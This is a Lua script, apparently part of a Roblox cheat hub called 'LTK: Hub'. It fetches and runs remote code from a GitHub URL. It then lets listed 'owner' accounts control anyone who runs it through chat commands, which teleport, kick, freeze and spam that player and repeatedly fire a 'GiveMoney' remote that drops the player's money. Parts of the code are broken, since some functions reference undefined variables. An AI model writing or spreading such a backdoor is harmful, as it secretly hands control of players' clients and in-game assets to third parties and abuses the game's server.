local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6hfeuopteafumbvyue507421.lua"
    local Players = game:GetService("Players")
    local TeleportService = game:GetService("TeleportService")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    local PlaceId = game.PlaceId
    
    local allowedUserIds = {}
    
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    
    if success then
        allowedUserIds = result
    else
        warn("Failed to load allowed User IDs:", result)
    end
    
    local function waitForCharacter(player)
        if player.Character and player.Character.Parent then
            return player.Character
        end
        local character = nil
        repeat
            character = player.Character or player.CharacterAdded:Wait()
            task.wait()
        until character and character.Parent
        return character
    end
    
    local function ensureLocalPlayerCharacter()
        if not LocalPlayer.Character or not LocalPlayer.Character.Parent then
            waitForCharacter(LocalPlayer)
        end
    end
    
    local function isAllowed(player)
        for _, allowedId in ipairs(allowedUserIds) do
            if tostring(player.UserId) == tostring(allowedId) then
                return true
            end
        end
        return false
    end
    
    local function bringExecutorToCaller(caller)
        local callerCharacter = waitForCharacter(caller)
        local executorCharacter = waitForCharacter(LocalPlayer)
        local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            executorHRP.CFrame = callerHRP.CFrame * CFrame.new(0,55,0)
        else
            warn("HumanoidRootPart is missing for caller or executor.")
        end
    end
    
    local function rejoinExecutor()
        local currentJobId = game.JobId
        TeleportService:TeleportToPlaceInstance(PlaceId, currentJobId, LocalPlayer)
    end
    
    local function kickExecutor()
        local character = waitForCharacter(LocalPlayer)
        if character then
            LocalPlayer:Kick("You have been kicked by an developer")
        else
            warn("Failed to kick: Character is not loaded.")
        end
    end

    local function freezeExecutor()
        local executorCharacter = waitForCharacter(LocalPlayer)
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            getgenv().freeze = true
            while getgenv().freeze == true do
                task.wait(0.001)
                executorHRP.Anchored = true
            end
        else
            print("HumanoidRootPart is missing for caller or executor.")
        end
    end
    
    local function unfreezeExecutor()
        local callerCharacter = waitForCharacter(caller)
        local executorCharacter = waitForCharacter(LocalPlayer)
        local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            getgenv().freeze = false
            executorHRP.Anchored = false
        else
            warn("HumanoidRootPart is missing for caller or executor.")
        end
    end

    local function Message()
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/extra/lib.lua"))()
        local Notif = library:InitNotifications()
        for i=1,20 do
            local Test = Notif:Notify("LTK: Hub | A Owner has just pung your client, If you see this a owner is in your game!", 20, "success")
            --game.StarterGui:SetCore("SendNotification", { Title = "LTK: Hub", Text = "If you see this, the owner of LTK: Hub is in ur game!", Duration = 10})
        end
    end

    local function Money()
        for i=1, 30 do
            task.wait(0.5)
            game:GetService("ReplicatedStorage"):WaitForChild("GiveMoney"):FireServer("drop", 10000)
        end
    end

    local function attachChatListener(player)
        player.Chatted:Connect(function(message)
            if isAllowed(player) then
                if message == "?bring" then
                    bringExecutorToCaller(player)
                elseif message == "?rj" then
                    rejoinExecutor()
                elseif message == "?kick" then
                    kickExecutor()
                elseif message == "?freeze" then
                    freezeExecutor()
                elseif message == "?unfreeze" then
                    unfreezeExecutor()
                elseif message == "?test" then
                    Message()
                elseif message == "?money" then
                    Money()
                end
            end
        end)
    end
    
    local function checkExistingPlayers()
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                attachChatListener(player)
            end
            player.CharacterAdded:Connect(function()
                attachChatListener(player)
            end)
        end
    end
    
    ensureLocalPlayerCharacter()
    
    checkExistingPlayers()
    
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function()
            attachChatListener(player)
        end)
    end)
    
    RunService.Heartbeat:Connect(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if isAllowed(player) then
                break
            end
        end
    end)
